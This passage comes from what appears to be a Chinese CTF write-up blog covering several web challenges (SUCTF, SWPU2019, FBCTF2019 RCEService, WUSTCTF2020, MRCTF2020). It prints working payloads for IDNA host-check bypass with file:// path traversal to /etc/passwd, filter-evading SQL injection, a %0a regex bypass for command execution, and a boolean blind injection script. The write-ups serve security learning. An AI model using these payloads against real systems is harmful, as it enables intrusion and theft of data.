uni=<span class="hljs-built_in">chr</span>(x)<br>        url=<span class="hljs-string">&quot;http://suctf.c&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(uni)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> getUrl(url):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;str: &quot;</span>+uni+<span class="hljs-string">&#x27; unicode: \\u&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(x))[<span class="hljs-number">2</span>:])<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getUrl</span>(<span class="hljs-params">url</span>):<br>    url=url<br>    host=parse.urlparse(url).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    parts=<span class="hljs-built_in">list</span>(urlsplit(url))<br>    host=parts[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    newhost=[]<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    parts[<span class="hljs-number">1</span>]=<span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)<br>    finalUrl=urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]<br>    host=parse.urlparse(finalUrl).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br> <br> <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    get_unicode()<br><br></code></pre></td></tr></table></figure>
<p><img src="/images/I1L8OCMS423Q6WG591.png" srcset="/img/loading.gif" lazyload></p>
<p>我们只需要让其中的一个去读取文件即可，需要url编码一下<br>先读一下etc&#x2F;passwd<br>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/getUrl?url=file:/</span><span class="hljs-regexp">/suctf.c%E2%84%82/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure>
<p><img src="/images/AZEKDNX7SKH3FWH78.png" srcset="/img/loading.gif" lazyload><br>部分nginx的配置文件所在位置</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">配置文件： <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>conf/nginx.conf<br>配置文件存放目录：<span class="hljs-regexp">/etc/</span>nginx<br>主配置文件：<span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/conf/</span>nginx.conf<br>管理脚本：<span class="hljs-regexp">/usr/</span>lib64<span class="hljs-regexp">/systemd/</span>system/nginx.service<br>模块：<span class="hljs-regexp">/usr/</span>lisb64<span class="hljs-regexp">/nginx/m</span>odules<br>应用程序：<span class="hljs-regexp">/usr/</span>sbin/nginx<br>程序默认存放位置：<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nginx/</span>html<br>日志默认存放位置：<span class="hljs-regexp">/var/</span>log/nginx<br></code></pre></td></tr></table></figure>
<p>挨个读读试试<br>在配置文件中我们发现<br><img src="/images/JEBYS4JSYT3P6T3.png" srcset="/img/loading.gif" lazyload><br>读取<br><img src="/images/RENLJ0UVWDRW3HCA4.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>登录页面，有注册先注册<br>这里admin被注册了，注册一个admin1，登录<br><img src="/images/EIMTIHG6GCW38WPEIR.png" srcset="/img/loading.gif" lazyload><br>疑似注入点，万能钥匙测测<br><img src="/images/JVEITI0I8S3UWTV.png" srcset="/img/loading.gif" lazyload><br>存在过滤，再测测<br>一番测试以后，发现过滤了or,#,–+和空格</p>
<ul>
<li><p>空格被过滤<br>可以用&#x2F;**&#x2F;代替空格</p>
</li>
<li><p>注释符被过滤<br>将后面的单引号闭合即可</p>
</li>
<li><p>or被过滤<br>导致 order by 、information_schema都不能用。<br>于是查表名可以使用select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database()</p>
</li>
</ul>
<p>先判断列数<br>因为or被禁 order by无法用，所以用group by ，一样的效果<br>payload</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">group</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">by</span><span class="hljs-comment">/**/</span><span class="hljs-number">23</span>,<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/80730O6C28XTPBO8R9.png" srcset="/img/loading.gif" lazyload><br>判断为22列<br>回显位</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;union/**/select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>&#x27;<br></code></pre></td></tr></table></figure>
<p>回显位为2，3</p>
<p>爆数据库</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;/**/union/**/select/**/<span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>&#x27;<br></code></pre></td></tr></table></figure>
<p><img src="/images/7P3H0XHID45SU1M592.png" srcset="/img/loading.gif" lazyload></p>
<p>爆表</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;union/**/select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=<span class="hljs-string">&quot;web1&quot;</span>&#x27;<br></code></pre></td></tr></table></figure>
<p><img src="/images/BOGXTMWDKOVT3N28.png" srcset="/img/loading.gif" lazyload></p>
<p>因为关键字被禁，所以我们不能直接爆字段，我们可以绕过这一步骤直接通过表来爆值<br>学习到了一个新的概念：使用无列名注入技巧获取字段值<br>无列名注入</p>
<ol>
<li><p>如果information_schema被WAF,得到表名之后使用无列名注入技巧获取字段值.<br><img src="/images/2016410-20200519163717474-1767458536.png" srcset="/img/loading.gif" lazyload></p>
</li>
<li><p>之后就可以利用数字来对应相应的列,进行查询<br><img src="/images/2016410-20200519164320071-1957869897.png" srcset="/img/loading.gif" lazyload></p>
</li>
</ol>
<p> 这里有两点需要注意一下:</p>
<p>1.列名需要用&#96;&#96;包裹起来<br>2.使用子查询的时候,即一个查询嵌套在另一个查询中,内层查询的结果可以作为外层查询的条件,内层查询到的结果需要起一个别名(as)</p>
<ol start="3">
<li>如果反引号&#96;&#96;被过滤,可以使用为字段起别名的方式.<br><img src="/images/2016410-20200519164947664-637568242.png" srcset="/img/loading.gif" lazyload><br>现在的思路就明朗了<br>payload<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;/**/union/**/select/**/<span class="hljs-number">1</span>,database(),(select/**/group_concat(`<span class="hljs-number">3</span>`)/**/from/**/(select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>/**/as/**/a,<span class="hljs-number">3</span>/**/union/**/select/**/*/**/from/**/users)heihei),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>&#x27;<br></code></pre></td></tr></table></figure></li>
</ol>
<p>代码解析</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">group_concat</span><span class="hljs-params">(`<span class="hljs-number">3</span>`)</span></span><br></code></pre></td></tr></table></figure>
<p>上面表示列为3</p>
<p>heiheihei表示派生表的别名，名字随意<br><img src="/images/I1B1KP1JAETRBPE9A.png" srcset="/img/loading.gif" lazyload><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46230316/article/details/106668182">无列名注入总结</a></p>
<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>题目说要以 JSON 格式输入命令<br>而JSON 需要给一个键值对<br>格式为</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;heiheihei&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
<p>先输入</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ls&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/JOG2DW2SH1II1WFM.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ls /&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
<p>没有回显，错误<br>尝试使用{“cmd”:”cat index.php”} , 返回: Hacking attempt detected 估计过滤了cat 。<br>dirsearch什么都没扫出来<br>看了看大佬的wp，这题应该是会给源代码的</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;?php<br><br>putenv(&#x27;PATH=/home/rceservice/jail&#x27;);<br><br><span class="hljs-keyword">if</span> (isset($_REQUEST<span class="hljs-literal">[&#x27;<span class="hljs-identifier">cmd</span>&#x27;]</span>)) &#123;<br>  $json = $_REQUEST<span class="hljs-literal">[&#x27;<span class="hljs-identifier">cmd</span>&#x27;]</span>;<br><br>  <span class="hljs-keyword">if</span> (!is<span class="hljs-constructor">_string($<span class="hljs-params">json</span>)</span>) &#123;<br>    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125; elseif (preg<span class="hljs-constructor">_match(&#x27;<span class="hljs-operator">/</span>^.<span class="hljs-operator">*</span>(<span class="hljs-params">alias</span>|<span class="hljs-params">bg</span>|<span class="hljs-params">bind</span>|<span class="hljs-params">break</span>|<span class="hljs-params">builtin</span>|<span class="hljs-params">case</span>|<span class="hljs-params">cd</span>|<span class="hljs-params">command</span>|<span class="hljs-params">compgen</span>|<span class="hljs-params">complete</span>|<span class="hljs-params">continue</span>|<span class="hljs-params">declare</span>|<span class="hljs-params">dirs</span>|<span class="hljs-params">disown</span>|<span class="hljs-params">echo</span>|<span class="hljs-params">enable</span>|<span class="hljs-params">eval</span>|<span class="hljs-params">exec</span>|<span class="hljs-params">exit</span>|<span class="hljs-params">export</span>|<span class="hljs-params">fc</span>|<span class="hljs-params">fg</span>|<span class="hljs-params">getopts</span>|<span class="hljs-params">hash</span>|<span class="hljs-params">help</span>|<span class="hljs-params">history</span>|<span class="hljs-params">if</span>|<span class="hljs-params">jobs</span>|<span class="hljs-params">kill</span>|<span class="hljs-params">let</span>|<span class="hljs-params">local</span>|<span class="hljs-params">logout</span>|<span class="hljs-params">popd</span>|<span class="hljs-params">printf</span>|<span class="hljs-params">pushd</span>|<span class="hljs-params">pwd</span>|<span class="hljs-params">read</span>|<span class="hljs-params">readonly</span>|<span class="hljs-params">return</span>|<span class="hljs-params">set</span>|<span class="hljs-params">shift</span>|<span class="hljs-params">shopt</span>|<span class="hljs-params">source</span>|<span class="hljs-params">suspend</span>|<span class="hljs-params">test</span>|<span class="hljs-params">times</span>|<span class="hljs-params">trap</span>|<span class="hljs-params">type</span>|<span class="hljs-params">typeset</span>|<span class="hljs-params">ulimit</span>|<span class="hljs-params">umask</span>|<span class="hljs-params">unalias</span>|<span class="hljs-params">unset</span>|<span class="hljs-params">until</span>|<span class="hljs-params">wait</span>|<span class="hljs-params">while</span>|[\<span class="hljs-params">x00</span>-\<span class="hljs-params">x1FA</span>-Z0-9!#-\<span class="hljs-operator">/</span>;-@\[-`|~\<span class="hljs-params">x7F</span>]+)</span>.*$/&#x27;, $json)) &#123;<br>    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    echo &#x27;Attempting <span class="hljs-keyword">to</span> run command:&lt;br/&gt;&#x27;;<br>    $cmd = json<span class="hljs-constructor">_decode($<span class="hljs-params">json</span>, <span class="hljs-params">true</span>)</span><span class="hljs-literal">[&#x27;<span class="hljs-identifier">cmd</span>&#x27;]</span>;<br>    <span class="hljs-keyword">if</span> ($cmd !== NULL) &#123;<br>      system($cmd);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      echo &#x27;Invalid input&#x27;;<br>    &#125;<br>    echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure>

<p>代码中使用putenv(‘PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jail’); 配置系统环境变量，而我们用不了 cat 也有可能是在这个环境变量下没有这个二进制文件</p>
<p>因为这些命令实际上是存放在特定目录中封装好的程序，PATH环境变量就是存放这些特定目录的路径方便我们去直接调用这些命令，所以此处部分命令我们得使用其存放的绝对路径去调用</p>
<p>然后就是正则匹配的绕过了<br>可以注意到正则表达式采用了^xxx$的格式，同时也采用了.*这样的贪婪匹配，所以有两个方案来绕过正则——回溯次数超限和利用%0a。</p>
<p>利用%0a：%0a对于^xxx$这个格式的绕过太常见了，只需要注意下表达式中存在一段</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>-\<span class="hljs-keyword">x</span><span class="hljs-number">1</span>F<br></code></pre></td></tr></table></figure>
<p>会匹配一个%0a，但多在payload前后加几个%0a就行了。<br><img src="/images/VD0G2K3MS8WJMY0.png" srcset="/img/loading.gif" lazyload><br><img src="/images/20201203222019541.png" srcset="/img/loading.gif" lazyload><br>看看现在能不能行</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;ls /&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/images/QC88QV83GL7BO.png" srcset="/img/loading.gif" lazyload><br>根目录中没有flag<br>用find查找</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;find / -name flag*&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure>
<p>没有报错但也没有显示，那么说这个环境变量下也没有find</p>
<p><strong>Linux命令的位置：&#x2F;bin,&#x2F;usr&#x2F;bin，默认都是全体用户使用，&#x2F;sbin,&#x2F;usr&#x2F;sbin,默认root用户使用</strong><br><img src="/images/Q2BO12RTCT42RURJXEVW.png" srcset="/img/loading.gif" lazyload><br>在&#x2F;usr&#x2F;bin下找到了find<br>这样来使用</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;/usr/bin/find / -name flag*&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/images/KXA7MY8AXFZUXW.png" srcset="/img/loading.gif" lazyload><br>找到了flag的路径<br><img src="/images/S73VKNZ1Z1VDVZYA.png" srcset="/img/loading.gif" lazyload><br>找到cat的路径</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/images/B4QC95042UQCY2WB.png" srcset="/img/loading.gif" lazyload><br>再看看环境变量&#x2F;home&#x2F;rceservice&#x2F;jail下有什么<br><img src="/images/XKOFAHMGNI3P7XQAKZOOW.png" srcset="/img/loading.gif" lazyload><br>是ls，解释了为啥刚开始能用ls的原因</p>
<h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>只有一个输入框<br>输入1<br>回显Hi admin, your score is: 100<br>最多输到4<br>盲猜sql注入<br>输入</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>这里如果没有过滤字符or应该恒为真的<br>显示student number not exists.<br>有可能空格或者or被过滤</p>
<p>多轮测试过后发现仅空格被过滤，用&#x2F;**&#x2F;代替空格即可<br>将or换为and，因为只输入1也回显为true，and的后面也为true才能达到布尔盲注的目的</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>and<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>发现规律，命令错误会报错<br>使用布尔盲注<br>编写python脚本方便使用</p>
<figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs hsp">import requests<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span> :<br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> True:<br>        i = i + <span class="hljs-number">1</span><br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            mid = (low + high) <span class="hljs-comment">// 2</span><br>            <span class="hljs-meta"># payload = f&#x27;<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>and<span class="hljs-comment">/**/</span><span class="hljs-keyword">if</span>(ascii(substr((select<span class="hljs-comment">/**/</span>group_concat(schema_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>information_schema.schemata),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)%<span class="hljs-number">23</span>&#x27;</span><br>            <span class="hljs-meta"># payload = f&#x27;<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>and<span class="hljs-comment">/**/</span><span class="hljs-keyword">if</span>(ascii(substr((select<span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_schema=<span class="hljs-string">&quot;ctf&quot;</span>),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)%<span class="hljs-number">23</span>&#x27;</span><br>            <span class="hljs-meta"># payload = f&#x27;<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>and<span class="hljs-comment">/**/</span><span class="hljs-keyword">if</span>(ascii(substr((select<span class="hljs-comment">/**/</span>group_concat(column_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_name=<span class="hljs-string">&quot;flag&quot;</span>),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)%<span class="hljs-number">23</span>&#x27;</span><br>            payload = f<span class="hljs-string">&#x27;1/**/and/**/if(ascii(substr((select/**/group_concat(value)/**/from/**/ctf.flag),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>            <span class="hljs-meta"># print(payload)</span><br>            url = f<span class="hljs-string">&quot;http://ac3f56f2-dc89-4ab5-a066-b6f2d94da972.node5.buuoj.cn:81/?stunum=&#123;payload&#125;&quot;</span><br>            <span class="hljs-meta">#print(url)</span><br>            <span class="hljs-meta"># data=&#123;</span><br>            <span class="hljs-meta"># <span class="hljs-string">&quot;&quot;</span>:f<span class="hljs-string">&quot;admin&#x27; and &#123;payload&#125;#&quot;</span>,</span><br>            <span class="hljs-meta">#</span><br>            <span class="hljs-meta"># &#125;</span><br>            r = requests.get(url=url)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;admin&#x27;</span> in r.text:<br>                low = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = mid<br>        <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>            result += chr(low)<br>            <span class="hljs-keyword">print</span>(result)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>


<h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>源代码里是有我们需要的东西的</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;!--<br><span class="hljs-regexp">//</span><span class="hljs-number">1</span>st<br><span class="hljs-variable">$query</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<span class="hljs-regexp">//</span>可以理解为获取输入的字符信息,获取的是?后面的值<br><br> <span class="hljs-keyword">if</span>( substr_count(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;_&#x27;</span>) !== <span class="hljs-number">0</span> || substr_count(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;%5f&#x27;</span>) != <span class="hljs-number">0</span> )&#123;<span class="hljs-regexp">//</span>substr_count获取字符的出现次数<br>    die(<span class="hljs-string">&#x27;Y0u are So cutE!&#x27;</span>);<br>&#125;<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>] !== <span class="hljs-string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="hljs-string">&#x27;/^23333$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>]))&#123;<br>    echo <span class="hljs-string">&quot;you are going to the next ~&quot;</span>;<br>&#125;<br>!--&gt;<br></code></pre></td></tr></table></figure>
<p>开始绕<br>他没有大小写的检测%5f用%5F绕过<br>以$结尾也没有禁用换行符，就用%0a绕过<br>payload</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?b[u<span class="hljs-meta">%</span><span class="hljs-number">5</span>Fp<span class="hljs-meta">%</span><span class="hljs-number">5</span>Ft=<span class="hljs-number">23333</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure>
<p><img src="/images/H37HXSCW5QM6ZXX.png" srcset="/img/loading.gif" lazyload><br>进入再源代码发现一个加密信息<br>复制粘贴在控制台里<br><img src="/images/B8K9LNDE6H7CN95S.png" srcset="/img/loading.gif" lazyload><br>那么POST Merak,值随意</p>
